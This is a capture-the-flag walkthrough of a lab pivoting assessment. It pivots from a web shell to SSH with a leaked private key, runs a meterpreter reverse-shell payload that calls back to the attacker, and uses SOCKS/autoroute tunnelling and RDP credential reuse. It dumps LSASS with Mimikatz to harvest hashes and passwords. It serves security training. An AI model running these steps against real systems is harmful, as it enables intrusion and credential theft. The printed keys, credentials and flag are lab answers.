# Scenario
A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a web shell in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are below:

### Objectives: 
- Start from external and access the first system via the web shell left in place.
- Use the web shell access to enumerate and pivot to an internal host.
- Continue enumeration and pivoting until you reach the Inlanefreight Domain Controller and capture the associated flag.
- Use any data, credentials, scripts, or other information within the environment to enable your pivoting attempts.
- Grab any/all flags that can be found.

### To Be Answered:

1. Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.
2. Submit the credentials found in the user's home directory.
3. Enumerate the internal network and discover another active host.
4. Use the information you gathered to pivot to the discovered host.
5. In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?
6. For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.
7. Submit the contents of C:\Flag.txt located on the Domain Controller.

> This is for training purposes. The answers won't be revealed.


### LAB 

<img width="1923" height="772" alt="image" src="https://github.com/user-attachments/assets/259b539c-1035-4fca-870b-39b97fae2caf" />

```
www-data@inlanefreight.local:…/www/html# cd /home/
www-data@inlanefreight.local:/home/ ls

administrator
webadmin
```

```
cd webadmin
ls
```


```
www-data@inlanefreight.local:/home# cd webadmin/


www-data@inlanefreight.local:/home/webadmin# ls
for-admin-eyes-only
id_rsa
```

<img width="768" height="82" alt="image" src="https://github.com/user-attachments/assets/9203926a-93a2-4220-945c-bf8513851a1e" />


```
www-data@inlanefreight.local:/home/webadmin# cat for-admin-eyes-only
# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of :
Plain Human work!
```

Credentials: `mlefay:Plain Human work!`


```
www-data@inlanefreight.local:/home/webadmin# cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

On Linux Machine make an `id_rsa ` file using the key discovered above:

```
┌─[eu-academy-5]─[10.10.14.42]─[htb-ac-943240@htb-mbq6hhavbq]─[~]
└──╼ [★]$ sudo nano id_rsa
┌─[eu-academy-5]─[10.10.14.42]─[htb-ac-943240@htb-mbq6hhavbq]─[~]
└──╼ [★]$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Grant permissions to they private key:

```
┌─[eu-academy-5]─[10.10.14.42]─[htb-ac-943240@htb-mbq6hhavbq]─[~]
└──╼ [★]$ sudo chmod 600 id_rsa
```


Use the private key to connect to the spawned target machine over SSH, utilizing the same username webadmin:

```
$ ssh -i id_rsa webadmin@10.129.229.129
```

Checking the network interfaces:

```
webadmin@inlanefreight:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:dd:f3 brd ff:ff:ff:ff:ff:ff
    inet 10.129.229.129/16 brd 10.129.255.255 scope global dynamic ens160
       valid_lft 2821sec preferred_lft 2821sec
    inet6 dead:beef::250:56ff:fe94:ddf3/64 scope global dynamic mngtmpaddr 
       valid_lft 86396sec preferred_lft 14396sec
    inet6 fe80::250:56ff:fe94:ddf3/64 scope link 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:31:12 brd ff:ff:ff:ff:ff:ff
    inet 172.16.5.15/16 brd 172.16.255.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe94:3112/64 scope link 
       valid_lft forever preferred_lft forever
```

172.16.5.0/16 network

Ping sweep to enumerate other hosts on the same network:


<img width="1047" height="133" alt="image" src="https://github.com/user-attachments/assets/2712a6bb-6a54-4cc8-ab66-0e9480456778" />


Pivot to the discovered host:

Generate a Linux meterpreter payload to setup for pivoting through Metasploit:

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=9001 -f elf -o 99c0b43c4bec2bdc280741d8f3e40338.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: 99c0b43c4bec2bdc280741d8f3e40338.elf
```

Transfer the payload to the spawned target machine using scp:

```
scp -i id_rsa 99c0b43c4bec2bdc280741d8f3e40338.elf webadmin@10.129.229.129:~/

99c0b43c4bec2bdc280741d8f3e40338.elf          100%  250     3.2KB/s   00:00
```

Run msfconsole and use the exploit/multi/handler module to catch the call-back from the spawned target machine:

```
msfconsole -q
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.10.xx.xx
LHOST => 10.10.14.42
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 9001
LPORT => PWNPO
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD linux/x64/meterpreter/reverse_tcp
PAYLOAD => linux/x64/meterpreter/reverse_tcp
```

```
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 10.10.14.42:9001
```

Back on the webadmin:

```
webadmin@inlanefreight:~$ ls
99c0b43c4bec2bdc280741d8f3e40338.elf  for-admin-eyes-only  id_rsa
webadmin@inlanefreight:~$ chmod +x 99c0b43c4bec2bdc280741d8f3e40338.elf
webadmin@inlanefreight:~$ ./99c0b43c4bec2bdc280741d8f3e40338.elf
```

Checking  Meterpreter session a shell is established successfully on the exploit/multi/handler module:


<img width="1019" height="230" alt="image" src="https://github.com/user-attachments/assets/7978a98e-e169-43ae-b55c-b4a95bb70688" />

Set up the auxiliary/server/socks_proxy module to configure a local proxy.
In Meterpreter session:

```
(Meterpreter 1)(/home/webadmin) > bg
[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use auxiliary/server/socks_proxy
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set SRVPORT 9050
SRVPORT => 9050
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set VERSION 4a
VERSION => 4a
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> run
```

-->


<img width="908" height="149" alt="image" src="https://github.com/user-attachments/assets/44791e88-3bd0-45a6-89cf-dc186568846a" />

Interact with session one to autoroute:

```
sessions -i 1
[*] Starting interaction with 1...
```

--> 

```
(Meterpreter 1)(/home/webadmin) > run autoroute -s 172.16.5.0/16
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.0.0...
[+] Added route to 172.16.5.0/255.255.0.0 via 10.129.229.129
[*] Use the -p option to list all active routes
```

Once the route has been added, enumerate 172.15.5.25 using Nmap through proxychains:

```
proxychains nmap 172.16.5.35 -Pn -sT

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-20 13:26 GMT
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.35:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.35:21-<--denied
<SNIP>
Nmap scan report for 172.16.5.35
Host is up (0.015s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

Port 3389 on 172.16.5.35 is open; "credentials reuse" security misconfiguration using mlefay:Plain Human work! will work by connecting with xfreerdp through proxychains:

```
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'
```


<img width="756" height="597" alt="image" src="https://github.com/user-attachments/assets/3db191a1-d2ed-402b-ab4e-94dbe96f8545" />

Open Powershell and find the flag:

```
PS C:\Users\mlefay> type C:\Flag.txt

S1ngl3-Piv07-3@sy-Day
```

Finding which user is vulnerable:

Download Mimikatz:

```
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
unzip mimikatz_trunk.zip
```

Within the x64 folder, copy and paste mimikatz.exe into 172.16.5.35 with the credentials `mlefay:Plain Human work!` using the same xfreerdp session from the previous section:


<img width="744" height="402" alt="image" src="https://github.com/user-attachments/assets/ea486ffd-b87e-4f76-9f2c-bdc5b450db85" />


<img width="763" height="403" alt="image" src="https://github.com/user-attachments/assets/744b5c9c-986b-4518-96e0-8829554993f1" />


<img width="753" height="401" alt="image" src="https://github.com/user-attachments/assets/ae4335e2-fa33-491a-9f4f-3396716b38f5" />


<img width="760" height="594" alt="image" src="https://github.com/user-attachments/assets/0536c309-8fca-4f48-9832-b5e99624766e" />

Find Local Security Authority Process and create a dump file:


<img width="621" height="444" alt="image" src="https://github.com/user-attachments/assets/a465f2b8-fbf8-4416-b2ca-2c4281ef65b9" />

Dump file written to `C:\Users\mlefay\AppData\Local\Temp\lsass.DMP:`

Launch Mimikatz:

```
.#####.   mimikatz 2.2.0 (x64) #19041 Sep 3 2025 14:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::minidump C:\Users\mlefay\AppData\Local\Temp\lsass.DMP
Switch to MINIDUMP : 'C:\Users\mlefay\AppData\Local\Temp\lsass.DMP'
```

```
mimikatz # sekurlsa::LogonPasswords
```

```
Authentication Id : 0 ; 160843 (00000000:0002744b)
Session           : Service from 0
User Name         : vfrank
Domain            : INLANEFREIGHT
Logon Server      : ACADEMY-PIVOT-D
Logon Time        : 11/20/2022 10:09:13 AM
SID               : S-1-5-21-3858284412-1730064152-742000644-1103
        msv :
         [00000003] Primary
         * Username : vfrank
         * Domain   : INLANEFREIGHT
         * NTLM     : 2e16a00be74fa0bf862b4256d0347e83
         * SHA1     : b055c7614a5520ea0fc1184ac02c88096e447e0b
         * DPAPI    : 97ead6d940822b2c57b18885ffcc5fb4
        tspkg :
        wdigest :
         * Username : vfrank
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : vfrank
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : Imply wet Unmasked!
        ssp :
        credman :
```
`vfrank` is vulnerable

Enumerate the 172.16.6.0/16 network utilizing a PowerShell ping sweep using the previous windows session:

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\mlefay> 1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
172.16.6.1: False
172.16.6.2: False
172.16.6.23: False
172.16.6.24: False
172.16.6.25: True
172.16.6.26: False
```

The 172.16.6.25 host is alive. Using the credentials `vfrank:Imply wet Unmasked!` grabbed from before, connect to the host with RDP:


<img width="765" height="593" alt="image" src="https://github.com/user-attachments/assets/450cb6e8-44f1-4fac-8ced-a53c568be277" />


<img width="760" height="588" alt="image" src="https://github.com/user-attachments/assets/ce024b9a-0bf9-4d72-8839-d8491b0dda26" />

Once connected open the CMD prompt and get the flag:

```
Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\vfrank>type C:\Flag.txt
XXXXXXXXXXXXXXXXXXXXXXXXX
```

Using the same RDP connection to the 172.16.6.25 host, open This PC and go to the network share AutomateDCAdmin (Z:):


<img width="759" height="593" alt="image" src="https://github.com/user-attachments/assets/55328661-8255-4e42-b551-49f56e64a366" />

There will be the final flag we are looking for saved in a .txt file:


<img width="765" height="595" alt="image" src="https://github.com/user-attachments/assets/95bdc786-3410-4b0b-bd02-7b0edb1bb587" />

---
---

##  Conclusion

In this lab we:
- Re-entered the environment via a web shell and escalated to SSH with `webadmin`.
- Enumerated internal subnets and pivoted using SOCKS (Metasploit/Proxychains).
- Reused credentials to RDP into an internal workstation.
- Captured credentials from LSASS and leveraged them for the next hop.
- Retrieved flags from the workstation and the Domain Controller share.

Key takeaways: protect credential hygiene (no reuse, no plaintext notes), restrict lateral movement (Egress controls, endpoint hardening), and monitor for tunneling/proxy activity.

## Attribution / Copyright

xxx



















